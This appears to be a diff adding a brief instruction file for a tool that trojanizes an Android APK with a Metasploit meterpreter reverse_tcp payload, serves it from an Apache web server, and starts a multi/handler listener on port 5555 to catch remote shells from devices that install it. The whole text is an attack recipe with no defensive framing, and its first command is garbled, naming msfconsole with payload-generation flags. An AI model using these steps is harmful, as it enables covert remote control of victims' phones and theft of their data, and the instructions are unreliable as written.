@@ -1,0 +1,12 @@
+In this tool we use metasploit framework
+so first we download a light weigth apk and open terminal in root
+write the command "msfconsole -x {apk name} -p android/meterpreter/reverse_tcp LHOST={IP address of your kali linux} LPORT=5555 -o{output name of apk}"
+second command "mv {apk name} /var/www/html" and delete all other file and leave apk.
+third open second terminal and run this command "service apache2 start" and apache service is start then run "msfconsole"
+the write this command "use multi/handler"
+second command "set payload android/meterpreter/reverse_tcp"
+third command "set LHOST [ip address of kali linux}
+fourth command "set LPORT 5555"
+fifth command "run"
+
+
